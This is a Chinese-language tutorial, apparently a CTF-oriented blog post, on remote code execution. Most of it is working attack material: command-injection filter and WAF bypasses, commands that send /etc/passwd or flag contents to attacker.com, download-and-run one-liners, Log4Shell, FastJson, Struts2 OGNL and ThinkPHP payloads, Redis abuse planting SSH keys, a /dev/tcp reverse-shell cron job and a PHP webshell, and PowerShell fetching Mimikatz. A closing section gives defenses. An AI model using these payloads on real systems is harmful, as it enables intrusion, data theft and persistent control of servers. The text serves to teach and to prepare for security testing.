---

title: RCE 漏洞详解
tags: \[Web 安全, RCE, 命令注入, 代码注入, CTF, 漏洞利用]
date: 2024-07-02

---

# RCE 漏洞详解

RCE（Remote Code Execution，远程代码执行）是 Web 安全中危害最大的一类漏洞。攻击者通过 RCE 可以在目标服务器上执行任意系统命令或代码，直接获取服务器控制权。本文系统梳理 RCE 漏洞的分类、原理、利用技巧及防御方法。

## 1. RCE 漏洞概述

### 1.1 什么是 RCE

RCE 允许攻击者在远程服务器上执行任意**操作系统命令**或**脚本代码**。根据执行内容的不同，RCE 分为两大类：

| 类型                             | 说明         | 示例                     |
| -------------------------------- | ------------ | ------------------------ |
| **命令注入** (Command Injection) | 执行系统命令 | `ping 127.0.0.1; whoami` |
| **代码注入** (Code Injection)    | 执行脚本代码 | `eval("malicious_code")` |

### 1.2 危害等级

RCE 是 OWASP Top 10 中危害最高的漏洞类型之一。一旦被利用：

- 直接获取服务器 Shell 权限

- 读取任意文件（源码、配置、数据库密码）

- 横向移动攻击内网其他主机

- 植入后门，持久化控制

- 数据窃取、勒索软件部署

---

## 2. 命令注入 (Command Injection)

### 2.1 漏洞原理

应用调用系统命令时，将**用户可控的输入**拼接到命令字符串中并执行，导致攻击者可以注入额外的系统命令。

```php
// 漏洞代码示例
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);
```

正常访问：`?ip=127.0.0.1` → `ping -c 3 127.0.0.1`

恶意利用：`?ip=127.0.0.1; whoami` → `ping -c 3 127.0.0.1; whoami`

### 2.2 常见危险函数

#### PHP

```php
// 直接执行系统命令
system($cmd);
exec($cmd);
shell_exec($cmd);
passthru($cmd);

// 反引号（等价于shell_exec）
`$cmd`;

// popen系列
$handle = popen($cmd, 'r');
proc_open($cmd, $descriptorspec, $pipes);

// 需要注意的函数
preg_replace('/pattern/e', $replacement, $subject);  // PHP < 5.5 /e修饰符
assert($code);        // PHP < 7.2 将字符串当代码执行
call_user_func($fn);  // 回调函数
```

#### Python

```python
os.system(cmd)
os.popen(cmd)
subprocess.call(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
eval(user_input)
exec(user_input)
# pickle反序列化
pickle.loads(user_input)
```

#### Java

```java
Runtime.getRuntime().exec(cmd);
new ProcessBuilder(cmd).start();
// 表达式注入
// OGNL、SpEL、MVEL等表达式引擎
```

### 2.3 命令分隔符与拼接技巧

#### Linux 命令分隔符

| 符号    | 说明                           | 示例                 |
| ------- | ------------------------------ | -------------------- |
| `;`     | 顺序执行，互不影响             | `cmd1; cmd2`         |
| `\|`    | 管道，前命令输出作为后命令输入 | `cmd1 \| cmd2`       |
| `\|\|`  | 前命令失败才执行后命令         | `cmd1 \|\| cmd2`     |
| `&&`    | 前命令成功才执行后命令         | `cmd1 && cmd2`       |
| `&`     | 后台执行前命令，同时执行后命令 | `cmd1 & cmd2`        |
| `\n`    | 换行执行 (%0a)                 | `cmd1%0acmd2`        |
| `` ` `` | 命令替换                       | `` echo `whoami`  `` |
| `$()`   | 命令替换                       | `echo $(whoami)`     |

#### Windows 命令分隔符

| 符号   | 说明       |
| ------ | ---------- |
| `&`    | 顺序执行   |
| `&&`   | 成功则执行 |
| `\|\|` | 失败则执行 |
| `\|`   | 管道       |
| `%0a`  | 换行       |

### 2.4 空格绕过技巧

当空格被过滤时的替代方案：

```bash
# ${IFS}（Internal Field Separator，默认为空格、制表符、换行符）
cat${IFS}/etc/passwd
cat$IFS$1/etc/passwd

# 制表符 (%09)
cat%09/etc/passwd

# 花括号扩展
{cat,/etc/passwd}

# 输入重定向
cat</etc/passwd

# 环境变量拼接
X=$'\x20cat\x20/etc/passwd'&&$X
```

### 2.5 关键词过滤绕过

#### 绕过 cat/flag 等黑名单关键词

```bash
# 通配符绕过
cat /???/passwd          # ?匹配单个字符
cat /etc/pass*           # *匹配任意字符
cat /etc/pass[wd]       # []字符集匹配

# 拼接变量
a=c;b=at;c=/etc/passwd;$a$b $c

# 反斜杠
c\at /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd

# base64编码执行
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
`echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d`

# 十六进制绕过
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash

# 八进制绕过
$'\143\141\164' /etc/passwd

# 未初始化的变量（默认为空）
cat$u /etc/passwd
```

#### 绕过常见关键词

```bash
# 读取flag文件
cat /fla?
cat /fl[abcde]g
find / -name "fl*" -exec cat {} \;
nl /flag
less /flag
more /flag
head /flag
tail /flag
tac /flag           # 倒序输出
rev /flag | rev     # 两次反转还原
dd if=/flag
od -c /flag
curl file:///flag
```

### 2.6 无回显命令注入

当命令执行后没有直接回显时，需要采用带外通道（OOB, Out-of-Band）获取结果。

#### DNS 外带

```bash
# 将命令结果作为DNS查询子域名发送
nslookup $(whoami).attacker.com
ping -c 1 `whoami`.attacker.com

# curl DNS查询
curl http://$(whoami).attacker.com
```

#### HTTP 外带

```bash
# wget/curl外带数据
curl http://attacker.com/?data=$(cat /etc/passwd | base64)
wget http://attacker.com/$(cat /flag | base64)

# POST外带
curl -X POST -d "$(cat /flag)" http://attacker.com/collect
```

#### 时间盲注

```bash
# 根据命令结果决定是否sleep
if [ $(whoami) == "root" ]; then sleep 3; fi
```

#### 写入文件再访问

```bash
# 输出重定向到Web目录
cat /flag > /var/www/html/result.txt
cp /flag /var/www/html/flag.txt
```

### 2.7 长度限制绕过

当命令长度受限时的技巧：

```bash
# 通过文件分段写入
echo "ca" > /tmp/a
echo "t /" >> /tmp/a
echo "fla" >> /tmp/a
echo "g" >> /tmp/a
sh /tmp/a

# wget下载完整payload执行
wget attacker.com/shell.sh -O /tmp/s.sh && sh /tmp/s.sh

# 短命令技巧
# 利用ls -t按时间排序拼接，配合>写入文件名即命令
>nl
>\>\\
>fla\\
>g\\
>\>\\
>xx\\
ls -t>a
sh a
# 上面写入：nl \>fla\g >xx，按时间排序后拼接为命令
```

---

## 3. 代码注入 (Code Injection)

### 3.1 PHP 代码注入

#### eval()注入

```php
// 漏洞代码
$data = $_GET['data'];
eval("echo 'Hello $data';");
```

利用：`?data='; phpinfo(); //`

#### assert()注入

```php
// PHP < 7.2，assert支持字符串参数执行
$page = $_GET['page'];
assert("strpos('$page', '..') === false");
```

利用：`?page='.system('whoami').'`

#### preg_replace /e 修饰符

```php
// PHP < 5.5 的 /e 修饰符
preg_replace('/test/e', $_GET['cmd'], 'test');
// 或者更隐蔽的写法
preg_replace("/.*/e", $_GET['cmd'], "");
```

利用：`?cmd=system('whoami')`

#### create_function()注入

create_function 在底层使用 eval 创建函数：

```php
$func = create_function('$a', $_GET['code']);
// 底层等价于: eval("function __lambda_func($a) {".$_GET['code']."}")
```

利用：`?code=}phpinfo();//`

### 3.2 Python 代码注入

#### eval()注入

```python
eval("print(%s)" % user_input)
```

利用：

```python
__import__('os').system('whoami')
```

#### SSTI（服务端模板注入）

```python
# Jinja2 SSTI
render_template_string('Hello {{name}}', name=user_input)

# 利用payload
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__bases__[0].__subclasses__()[X](cmd)}}
```

#### Python 反序列化

```python
# pickle反序列化RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
pickle.loads(payload)  # 触发RCE
```

### 3.3 Java 代码注入

#### SpEL 表达式注入

Spring Expression Language 注入：

```java
// 漏洞代码
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);
exp.getValue();  // 执行用户输入的表达式
```

利用 payload：

```java
// 执行系统命令
T(java.lang.Runtime).getRuntime().exec('whoami')

// 更完整的RCE payload
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()
```

#### OGNL 注入

Struts2 中常见的 OGNL 注入：

    // Struts2 S2-045 典型payload
    %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

---

## 4. 组件与框架 RCE 漏洞

### 4.1 FastJson 反序列化

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}
```

利用链依赖 JNDI 注入，通过 LDAP/RMI 加载远程 Class 文件执行代码。

### 4.2 Log4j (Log4Shell CVE-2021-44228)

```java
// JNDI注入payload
${jndi:ldap://attacker.com/Exploit}
${jndi:rmi://attacker.com/Exploit}
${jndi:dns://attacker.com/Exploit}

// 绕过WAF的变体
${${lower:j}ndi:ldap://attacker.com/Exploit}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/Exploit}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/Exploit}
```

### 4.3 Shiro RememberMe 反序列化

Shiro 使用 AES-CBC 加密 RememberMe Cookie，密钥硬编码或使用默认密钥时，攻击者可以构造恶意序列化对象。

    // 默认密钥
    kPH+bIxk5D2deZiIxcaaaA==

    // 利用流程
    1. 构造CommonsCollections/Groovy等利用链的序列化对象
    2. 使用AES-CBC加密
    3. Base64编码后放入RememberMe Cookie
    4. 发送请求触发反序列化RCE

### 4.4 ThinkPHP

ThinkPHP 框架历史 RCE 漏洞：

#### ThinkPHP 5.x 控制器 RCE

    // 未开启强制路由时，直接调用控制器方法
    ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

    // ThinkPHP 5.0.x
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

    // 路由控制器RCE（TP 5.1/5.2）
    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami

#### ThinkPHP 5.x Request 类 RCE

    // 利用Request的filter属性
    _method=__construct&filter[]=system&method=get&get[]=whoami

### 4.5 Redis 未授权访问

```bash
# 连接Redis
redis-cli -h target.com

# 写入SSH公钥 (root用户)
config set dir /root/.ssh/
config set dbfilename authorized_keys
set key "\n\nssh-rsa AAA...\n\n"
save

# 写入crontab定时任务
config set dir /var/spool/cron/
config set dbfilename root
set key "\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\n"
save

# 写入WebShell (知道Web路径)
config set dir /var/www/html/
config set dbfilename shell.php
set key "\r\n\r\n<?php @eval(\$_POST['pass']); ?>\r\n\r\n"
save
```

---

## 5. 无参数 RCE

当函数调用不允许传入参数时的绕过技巧。

### 5.1 PHP 无参数函数链

```php
// 题目代码
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
// 限制：只能调用无参函数，如 a(b(c())) 形式
```

利用无参函数获取变量：

```php
// getallheaders()获取请求头
// current()获取数组第一个值
eval(current(getallheaders()));  // 在请求头中填入php代码

// get_defined_vars()获取所有已定义变量
var_dump(get_defined_vars());

// session_id()配合session_start()
eval(hex2bin(session_id(session_start())));  // Cookie中PHPSESSID设为hex编码的php代码

// 数组操作链
// array_rand()随机获取数组key
// array_flip()交换key和value
eval(array_rand(array_flip(get_defined_vars()))); // 爆破获取到_GET或_POST写入的变量
```

### 5.2 利用 PHP 内置函数读取文件

```php
// 读取文件内容
show_source(next(array_reverse(scandir(current(localeconv())))));
// 原理：localeconv()返回.=>['decimal_point'=>'.']
// current取到.，scandir('.')列出当前目录
// array_reverse反转，next取第二个(通常是flag文件)
// show_source显示文件内容

// highlight_file读取
highlight_file(array_rand(array_flip(scandir('.'))));
```

---

## 6. RCE 绕过 WAF 技巧

### 6.1 变量/编码绕过

```bash
# 变量拼接绕过
a=who;b=ami;$a$b

# 未初始化变量插入
cat$x /etc/passwd     # $x为空，等价于cat /etc/passwd

# 单引号/双引号绕过
w'h'o'am'i
w"h"o"am"i

# 反斜杠绕过
w\ho\am\i
```

### 6.2 进制编码绕过

```bash
# 八进制编码
$'\167\150\157\141\155\151'    # whoami

# 十六进制编码
echo "77686f616d69" | xxd -r -p | sh

# Base64
echo 'd2hvYW1p' | base64 -d | bash
```

### 6.3 通配符绕过

```bash
# 从文件系统读取命令
echo whoami > /tmp/w
$(</tmp/w)

# cat变体
/bin/c?t /etc/passwd
/???/c?t /etc/passwd
```

### 6.4 花括号技巧

```bash
# 花括号扩展
{a,b}  → a b
{who,ami} → who ami

# 花括号转换大小写（Bash 4+）
echo ${whoami^^}  # 大写
echo ${WHOAMI,,}  # 小写
```

---

## 7. Windows 环境 RCE

### 7.1 Windows 特有命令

```powershell
# 无回显时外带
certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe

# PowerShell下载执行
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# 读取文件
type flag.txt
findstr . flag.txt
more < flag.txt

# 管道符
dir | findstr flag
```

### 7.2 PowerShell 无文件攻击

```powershell
# 反射加载内存执行（不落地）
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"

# Base64编码执行
powershell -enc <base64_encoded_command>
```

---

## 8. RCE 防御方案

### 8.1 命令注入防御

- **避免调用系统命令**：优先使用编程语言的库函数替代

- **参数化调用**：使用参数列表而非字符串拼接（如`subprocess.call(['ping', ip])`而非`os.system('ping '+ip)`）

- **白名单校验**：限制输入为数字、IP 格式等可预期的值

- **输入转义**：对特殊字符进行转义处理

### 8.2 代码注入防御

- **禁止动态执行**：禁用`eval`/`exec`/`assert`/`create_function`等函数

- **使用安全表达式引擎**：配置沙箱，限制可调用类和方法

- **反序列化安全**：使用白名单限制可反序列化的类

- **依赖管理**：及时更新框架和组件版本，修复已知 CVE

### 8.3 php.ini 加固

```ini
# 禁用危险函数
disable_functions = system,exec,shell_exec,passthru,proc_open,popen,pcntl_exec,putenv,assert,dl,mail,imap_mail

# 限制open_basedir
open_basedir = /var/www/html:/tmp

# 关闭危险配置
allow_url_fopen = Off
allow_url_include = Off
expose_php = Off
```

---

## 9. CTF 实战清单

碰到 RCE 类题目，从以下维度逐一排查：

    1. 寻找用户可控的输入点 → GET/POST/Cookie/Header/文件上传
    2. 判断是否拼接系统命令 → system/exec/popen/shell_exec
    3. 测试命令分隔符 → ; | || && & %0a
    4. 测试管道命令 → 看是否有回显
    5. 无回显时测试外带 → curl/wget/DNS外带
    6. 测试各类编码绕过 → base64/hex/octal
    7. 测试通配符绕过 → ? * []
    8. 测试空格绕过 → ${IFS}/%09/< >
    9. 测试关键词过滤 → 拼接/变量/编码
    10. 检查框架版本 → 搜索已知CVE

记住 RCE 的核心公式：

**用户输入 + 命令拼接 + 未过滤 \= RCE**

防御的核心公式：

**不拼接 → 过滤 → 沙箱 → 最小权限**

---
